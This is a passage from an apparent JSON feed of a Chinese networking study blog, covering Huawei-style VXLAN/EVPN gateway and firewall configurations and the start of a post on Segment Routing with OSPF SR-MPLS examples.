l2</span><br><span class=\"line\"> encapsulation dot1q vid 10</span><br><span class=\"line\"> bridge-domain 10</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/1.20 mode l2</span><br><span class=\"line\"> encapsulation dot1q vid 20</span><br><span class=\"line\"> bridge-domain 20</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GE1/0/5</span><br><span class=\"line\"> undo portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip address 10.1.12.2 255.255.255.0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface LoopBack0</span><br><span class=\"line\"> ip address 2.2.2.2 255.255.255.255</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Nve1</span><br><span class=\"line\"> source 2.2.2.2</span><br><span class=\"line\"> vni 10 head-end peer-list protocol bgp</span><br><span class=\"line\"> vni 20 head-end peer-list protocol bgp</span><br><span class=\"line\">#</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\"> peer 3.3.3.3 as-number 100</span><br><span class=\"line\"> peer 3.3.3.3 connect-interface LoopBack0</span><br><span class=\"line\"> #</span><br><span class=\"line\"> ipv4-family unicast</span><br><span class=\"line\">  peer 3.3.3.3 enable</span><br><span class=\"line\"> #</span><br><span class=\"line\"> l2vpn-family evpn</span><br><span class=\"line\">  policy vpn-target</span><br><span class=\"line\">  peer 3.3.3.3 enable</span><br><span class=\"line\">  peer 3.3.3.3 advertise irb</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230131144906251.png\" alt=\"image-20230131144906251\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230131145050065.png\" alt=\"image-20230131145050065\"></p>\n<h2 id=\"分布式网关访问外网\"><a class=\"markdownIt-Anchor\" href=\"#分布式网关访问外网\">#</a> 分布式网关访问外网</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CE2-CE3</span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">peer 1.1.1.1 as 100</span><br><span class=\"line\">peer 1.1.1.1 con l 0</span><br><span class=\"line\">l2vpn</span><br><span class=\"line\">peer 1.1.1.1 en</span><br><span class=\"line\">peer 1.1.1.1 ad irb</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CE1</span><br><span class=\"line\">peer 2.2.2.2 as 100</span><br><span class=\"line\">peer 2.2.2.2 con l 0 </span><br><span class=\"line\">l2vpn </span><br><span class=\"line\">peer 2.2.2.2 en</span><br><span class=\"line\">peer 2.2.2.2 ad irb</span><br><span class=\"line\"></span><br><span class=\"line\">//1.建立EVPN邻居</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">ip vpn A </span><br><span class=\"line\">route 100:1</span><br><span class=\"line\">vxlan vni 99</span><br><span class=\"line\">vpn- 100:100 b evpn </span><br><span class=\"line\">vpn 100:100 e e</span><br><span class=\"line\"></span><br><span class=\"line\">int g1/0/3 </span><br><span class=\"line\">p l t </span><br><span class=\"line\">p t a v a </span><br><span class=\"line\"></span><br><span class=\"line\">int vlan 10</span><br><span class=\"line\">ip bin vpn A</span><br><span class=\"line\">ip add 192.168.10.1 24 </span><br><span class=\"line\"></span><br><span class=\"line\">ip rou vpn A  0.0.0.0 0 192.168.10.10 </span><br><span class=\"line\">ip rou vpn A  8.8.8.0 24 192.168.10.10</span><br><span class=\"line\"></span><br><span class=\"line\">bgp 100</span><br><span class=\"line\">ipv4 vpn A</span><br><span class=\"line\">import  static</span><br><span class=\"line\">ad l2vpn evpn   //vpnv4转换为EVPN type 5路由</span><br><span class=\"line\"></span><br><span class=\"line\">b 10</span><br><span class=\"line\">vxlan vni 10</span><br><span class=\"line\">evpn</span><br><span class=\"line\">rd 100:1</span><br><span class=\"line\">rt 100:1 b</span><br><span class=\"line\">b20</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\">int nv 1</span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">FW </span><br><span class=\"line\">int g1/0/0.1</span><br><span class=\"line\">vlan-type dot 10</span><br><span class=\"line\">ip add 192.168.10.10 24 </span><br><span class=\"line\"></span><br><span class=\"line\">fir zon trust</span><br><span class=\"line\">add g1/0/0.1</span><br><span class=\"line\">ser p p</span><br><span class=\"line\"></span><br><span class=\"line\">ip rou 0.0.0.0 0 192.168.10.1 </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><strong>Type5 路由 ——IP 前缀路由</strong></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230131220410404.png\" alt=\"image-20230131220410404\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230131220430645.png\" alt=\"image-20230131220430645\"></p>\n<p>发送时</p>\n<p>tpye 2，3 路由携带 evpn 实例下自身的 ERT</p>\n<p>type 5 路由携带 vpn 实例下 eert</p>\n<p>接收时</p>\n<p>匹配 vpn 实例下 eirt</p>\n<p>1.14</p>\n<p>EVN</p>\n<p>用于 vlan 的场景下实现跨数据中心互访，完成不同数据中心相同 vlan 互访，只用于二层互访</p>\n<p>@集成多播路由 (Inclusive Multicast Route) : 当 PE 之间的 BGP 邻居关系建立成功后，PE 之间会传递集成多播路由。用于生成 BUM 转发表，同时自动建立传送数<br>\n据报文的 VXLAN 隧道。</p>\n<p>MAC 地址通告路由 (MAC Advertisement Route) : BGP 邻居关系建立后，当 PE 上的 MAC 表信息发生变化时，PE 即向对等体 PE 发送 MAC 地址通告路由，用于更新对端 PE 上的 MAC 表，指导单播报文的转发。</p>\n<p>@以太自动发现路由（Ethernet Auto-Discovery Routa) : PE 之间的 BGP 邻居关系建立成功后，.PE 之间会传递以太自动发现路由。以太目动发现路由可以向其他 PE 通告本端 PE 对接入站点的 MAC 地址的可达性，主要用于 CE 多归属的场景中的水平分割和快速收敛。</p>\n<p>以太网段路由 (Ethernet Segment Route) : 当 PE 之间的 BGP 邻居关系建立成功后，PE 之间会传递以太网段路由，用来实现连接到相同 CE 的 PE 设备之间互相自动发现。以太网段路由主要用于 CE 多归属场景中的 DF 的选举。在单归属场景中，主要涉及前两种路由的交互。接下来我们就看一下，这两种路由信息是如何促成控制面表项和隧道生成的。</p>\n<p>type 1</p>\n<p>双规场景下实现别名，快速收敛，水平分割</p>\n<p>esi 用于实现 PE 是否连在一台 CE 上，本端 PE 知道，对端 PE 也知道</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201215825630.png\" alt=\"image-20230201215825630\"></p>\n<p>通过阻塞链路或者负载分担防环</p>\n<p>阻塞链路：single active</p>\n<p>负载分担：all- active</p>\n<p>多活时与 CE 相连的 PE 必须都是多活</p>\n<p>有一个单活就必须使用第一种</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201220430613.png\" alt=\"image-20230201220430613\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201221300402.png\" alt=\"image-20230201221300402\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230201222213560.png\" alt=\"image-20230201222213560\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203212914411.png\" alt=\"image-20230203212914411\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203213933709.png\" alt=\"image-20230203213933709\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203214050214.png\" alt=\"image-20230203214050214\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203214445292.png\" alt=\"image-20230203214445292\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203214823555.png\" alt=\"image-20230203214823555\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203215114418.png\" alt=\"image-20230203215114418\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203215133032.png\" alt=\"image-20230203215133032\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230203220526567.png\" alt=\"image-20230203220526567\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vlan batch 30 100 200</span><br><span class=\"line\">vsys enable</span><br><span class=\"line\">vsys name A 1</span><br><span class=\"line\"> assign vlan 100</span><br><span class=\"line\"> assign global-ip 203.1.1.1 203.1.1.10 free</span><br><span class=\"line\">interface Vlanif100</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.100.100 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Vlanif200</span><br><span class=\"line\"> ip address 192.168.200.200 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet0/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> ip binding vpn-instance default</span><br><span class=\"line\"> ip address 192.168.0.1 255.255.255.0</span><br><span class=\"line\"> alias GE0/METH</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/0</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/1</span><br><span class=\"line\"> portswitch</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\"> port link-type trunk</span><br><span class=\"line\"> port trunk allow-pass vlan 2 to 4094</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/2</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/3</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/4</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/5</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface GigabitEthernet1/0/6</span><br><span class=\"line\"> undo shutdown</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Virtual-if0</span><br><span class=\"line\">#</span><br><span class=\"line\">interface Virtual-if1</span><br><span class=\"line\">#</span><br><span class=\"line\">interface NULL0</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone local</span><br><span class=\"line\"> set priority 100</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone trust</span><br><span class=\"line\"> set priority 85</span><br><span class=\"line\"> add interface GigabitEthernet0/0/0</span><br><span class=\"line\"> add interface Virtual-if0</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone untrust</span><br><span class=\"line\"> set priority 5</span><br><span class=\"line\"> add interface Vlanif200</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone dmz</span><br><span class=\"line\"> set priority 50</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 192.168.200.1</span><br><span class=\"line\">ip route-static 203.1.1.0 255.255.255.240 vpn-instance A</span><br><span class=\"line\">#</span><br><span class=\"line\">user-interface con 0</span><br><span class=\"line\"> authentication-mode aaa</span><br><span class=\"line\"> idle-timeout 0 0</span><br><span class=\"line\">user-interface vty 0 4</span><br><span class=\"line\"> authentication-mode aaa</span><br><span class=\"line\"> protocol inbound ssh</span><br><span class=\"line\">user-interface vty 16 20</span><br><span class=\"line\">#</span><br><span class=\"line\">switch vsys A</span><br><span class=\"line\">sys </span><br><span class=\"line\">interface Vlanif100</span><br><span class=\"line\"> ip binding vpn-instance A</span><br><span class=\"line\"> ip address 192.168.100.100 255.255.255.0</span><br><span class=\"line\"> service-manage ping permit</span><br><span class=\"line\"></span><br><span class=\"line\">firewall zone local</span><br><span class=\"line\"> set priority 100</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone trust</span><br><span class=\"line\"> set priority 85</span><br><span class=\"line\"> add interface Vlanif100</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone untrust</span><br><span class=\"line\"> set priority 5</span><br><span class=\"line\"> add interface Virtual-if1</span><br><span class=\"line\">#</span><br><span class=\"line\">firewall zone dmz</span><br><span class=\"line\"> set priority 50</span><br><span class=\"line\">#</span><br><span class=\"line\">location</span><br><span class=\"line\">#</span><br><span class=\"line\">nat address-group A 0</span><br><span class=\"line\"> mode pat</span><br><span class=\"line\"> section 0 203.1.1.1 203.1.1.3</span><br><span class=\"line\">#</span><br><span class=\"line\">multi-linkif</span><br><span class=\"line\"> mode proportion-of-weight</span><br><span class=\"line\">#</span><br><span class=\"line\">security-policy</span><br><span class=\"line\"> rule name test</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  source-address 192.168.2.0 mask 255.255.255.0</span><br><span class=\"line\">  action permit</span><br><span class=\"line\">#</span><br><span class=\"line\">auth-policy</span><br><span class=\"line\">#</span><br><span class=\"line\">traffic-policy</span><br><span class=\"line\">#</span><br><span class=\"line\">policy-based-route</span><br><span class=\"line\">#</span><br><span class=\"line\">nat-policy</span><br><span class=\"line\"> rule name A</span><br><span class=\"line\">  source-zone trust</span><br><span class=\"line\">  destination-zone untrust</span><br><span class=\"line\">  source-address 192.168.1.0 mask 255.255.255.0</span><br><span class=\"line\">  source-address 192.168.2.0 mask 255.255.255.0</span><br><span class=\"line\">  action source-nat address-group A</span><br><span class=\"line\">#</span><br><span class=\"line\">quota-policy</span><br><span class=\"line\">#</span><br><span class=\"line\">pcp-policy</span><br><span class=\"line\">#</span><br><span class=\"line\">ip route-static 0.0.0.0 0.0.0.0 public</span><br><span class=\"line\">ip route-static 192.168.1.0 255.255.255.0 192.168.100.1</span><br><span class=\"line\">ip route-static 192.168.2.0 255.255.255.0 192.168.100.1</span><br><span class=\"line\">#</span><br><span class=\"line\">return</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2023/01/17/Segment%20Routing/",
            "url": "http://example.com/2023/01/17/Segment%20Routing/",
            "title": "Segment Routing",
            "date_published": "2023-01-17T05:38:45.000Z",
            "content_html": "<h2 id=\"0为什么需要sr\"><a class=\"markdownIt-Anchor\" href=\"#0为什么需要sr\">#</a> 0. 为什么需要 SR</h2>\n<p>1、简化底层控制平面，以 MPLS VPN 举例，需要部署 IGP、BGP、MPLS LDP 协议</p>\n<p>2、网络发展诉求，SDN 化</p>\n<p>1、简化控制平面，不存在 LDP 与 IGP 同步问题</p>\n<p>2、IP 骨干网可能有流量工程需求，需要部署 MPLS-TE，通过 RSVP 在端到端设备之间维护大量状态信息</p>\n<h2 id=\"1igp与ldp同步\"><a class=\"markdownIt-Anchor\" href=\"#1igp与ldp同步\">#</a> 1.IGP 与 LDP 同步</h2>\n<p>正常情况通过主 LSP 转发，如果主链路故障通过备 LSP 转发</p>\n<p><code>ospf  timer  lsp-sync  hold-max-cost ldp</code>  不同步时发布最大开销的 LSA</p>\n<p>SR 将 OSPF，ISIS，BGP 与标签结合，不存在同步问题，路由计算和标签分发都通过 IGP 或 BGP 实现，也称为 SR-MPLS BE（best effort），在控制平面移除了 LDP</p>\n<p>SR-MPLS TE（流量工程）对标 MPLS TE，控制平面移除了 RSVP 协议</p>\n<h2 id=\"2sr-分段路由-基本概念\"><a class=\"markdownIt-Anchor\" href=\"#2sr-分段路由-基本概念\">#</a> 2.SR - 分段路由 - 基本概念</h2>\n<p>SR 域（Segment Routing Domain）：SR 节点的集合。</p>\n<p>SID：即 Segment ID，用来标识唯一的段。在转发层面，可以映射为 MPLS 标签。</p>\n<p>SRGB（Segment Routing Global Block）：用户指定的为 Segment Routing MPLS 预留的全局标签集合。</p>\n<p>SRLB（Segment Routing Local Block）：用户指定的为 Segment Routing MPLS 预留的本地标签集合。这些标签在本地配置，仅在本地有效，但是会通过 IGP 对外发布，所以是全局可见。SRLB 当前主要用于配置 Binding SID。</p>\n<p><code>segement</code> : 节点对数据包要执行的指令</p>\n<p><code>Segment ID</code> ：IPV4 中为标签，IPV6 中为 ipv6 地址。用于标识 Segment。网络中的每个节点，链路都可以称为 Segment id</p>\n<p><code>源路由</code> ：源节点选择一条路径并压入有序的 Segment List，其他节点按照 segmeng list 转发</p>\n<p>通过对 IGP，BGP 扩展之后，可以实现源路由转发</p>\n<p><code>prefix segment</code> : 用于标识网络中的某个目的地址前缀，全局有效</p>\n<p><code>SRGB</code> ：用户指定的为 Segment Routing MPLS 预留的全局标签集合</p>\n<p><code>Adjacency Segment</code> : 用于标识网络中的某个邻接，本地有效</p>\n<h2 id=\"3segment分类\"><a class=\"markdownIt-Anchor\" href=\"#3segment分类\">#</a> 3.segment 分类</h2>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230206211033379.png\" alt=\"image-20230206211033379\"></p>\n<p>Node SID + adjacent SID</p>\n<h2 id=\"4ospf-for-sr-mpls\"><a class=\"markdownIt-Anchor\" href=\"#4ospf-for-sr-mpls\">#</a> 4.ospf for SR-MPLS</h2>\n<p>配置：</p>\n<p>1. 配置接口地址</p>\n<p>2. 使能 MPLS</p>\n<p>3. 全局使能 segment-routing</p>\n<p>4. 配置 IGP/BGP 路由协议</p>\n<p>5. 配置 IGP/BGP 对 SR 支持</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">undo DCN  //使用DCN功能实现网管通过网关网元对网元的远程管理</span><br><span class=\"line\">segment-routing</span><br><span class=\"line\"></span><br><span class=\"line\">ospf 1 router 1.1.1.1</span><br><span class=\"line\">network</span><br><span class=\"line\">opaque enable //OSPF引入type 10 opeart LSA支持SR</span><br><span class=\"line\">segment  mpls </span><br><span class=\"line\">segment global-block 16000 23999(SRGB)</span><br><span class=\"line\"></span><br><span class=\"line\">int l 0</span><br><span class=\"line\">ospf prefix-sid index 10 (node sid)</span><br><span class=\"line\"></span><br><span class=\"line\">display tunel all</span><br></pre></td></tr></table></figure>\n<p>扩展：通过 type 10 LSA</p>\n<p>type 10 LSA 使用 TLV 架构，携带三种 segment ID</p>\n<p>其中 type 10 中又包含了 type-4,7,8 满足对于 SR 相关信息的携带</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230206220417399.png\" alt=\"image-20230206220417399\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">type:opq-Area</span><br><span class=\"line\">LS-id:4.0.0.0  //opaque类型,本地SRGB范围</span><br><span class=\"line\">Adv rtr: 1.1.1.1 //产生者router-id</span><br><span class=\"line\">opaque type:4</span><br><span class=\"line\">opaque id:0</span><br><span class=\"line\">Router-Information LSA TLV information:</span><br><span class=\"line\">  SR-Algorithm TLV    //tlv-type8</span><br><span class=\"line\">    Algorithm:spf  //对外通告自己使用算法</span><br><span class=\"line\">\tSID/Label Range TLV: //SID或MPLS标签范围,type 9 tlv</span><br><span class=\"line\">\t\tRange Size: 8000  //范围内LSA数量</span><br><span class=\"line\">\t\tSID/Label sub-tlv:  //tlv type 1</span><br><span class=\"line\">\t\t\tLabel:16000 //起始范围</span><br><span class=\"line\">type:opq-Area</span><br><span class=\"line\">LS-id:7.0.0.0  //opaque类型</span><br><span class=\"line\">Adv rtr: 1.1.1.1 //产生者router-id</span><br><span class=\"line\">opaque type:7</span><br><span class=\"line\">opaque id:0</span><br><span class=\"line\">OSPFv2 Extended Prefix opaque LSA TLV information: //携带自身环回前缀信息，以及index值，即前缀SID(节点SID)</span><br><span class=\"line\">  OSPFV2 Extended Prefix TLV:  //tlv type1</span><br><span class=\"line\">\t\tRoute Type: Intra-Area </span><br><span class=\"line\">\t\tAF: IPV4-unicast</span><br><span class=\"line\">    flags:0x40</span><br><span class=\"line\">    prefix:1.1.1.1/32</span><br><span class=\"line\">    prefix SID sub-tlv:  //tlv type2</span><br><span class=\"line\">    \tflags: 0x00</span><br><span class=\"line\">      MT ID :0</span><br><span class=\"line\">\t\t\tAlgorithm: SPF</span><br><span class=\"line\">      index:10 //接口配置的偏移值或绝对值</span><br><span class=\"line\">type:opq-Area</span><br><span class=\"line\">LS-id:8.0.0.0  //opaque类型</span><br><span class=\"line\">Adv rtr: 1.1.1.1 //产生者router-id</span><br><span class=\"line\">opaque type:8</span><br><span class=\"line\">opaque id:0</span><br><span class=\"line\">OSPFV2 Extended Link opaque LSA TLV information: //携带邻接信息包括本地接口地址，链路类型，以及邻接SID标识这个邻居</span><br><span class=\"line\">\tOSPFV2 Extended Link TLV:  //tlv type 1</span><br><span class=\"line\">\t\tLink Type: TransNet</span><br><span class=\"line\">    link ID:10.1.12.1  //DR</span><br><span class=\"line\">    link data: 10.1.12.1</span><br><span class=\"line\">    LAN adj-sid sub-tlv:  //tlv type 2</span><br><span class=\"line\">    \tflags:0x60</span><br><span class=\"line\">      MT ID:0</span><br><span class=\"line\">      Weight:0</span><br><span class=\"line\">      Neighor ID:2.2.2.2</span><br><span class=\"line\">      Label:48020</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230206222830799.png\" alt=\"image-20230206222830799\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230209160852576.png\" alt=\"image-20230209160852576\"></p>\n<h2 id=\"5mpls-be隧道建立\"><a class=\"markdownIt-Anchor\" href=\"#5mpls-be隧道建立\">#</a> 5.MPLS BE 隧道建立</h2>\n<p>SR 转发模型，类似 MPLS 环境，一条 SR MPLS BE 隧道包含入节点、交换节点、出节点、也具备倒数第二跳弹出</p>\n<p>节点不会再通告，基于去往目的前缀的下一跳 SRGB 初始值 + 该前缀的 prfix id index 值得到 out 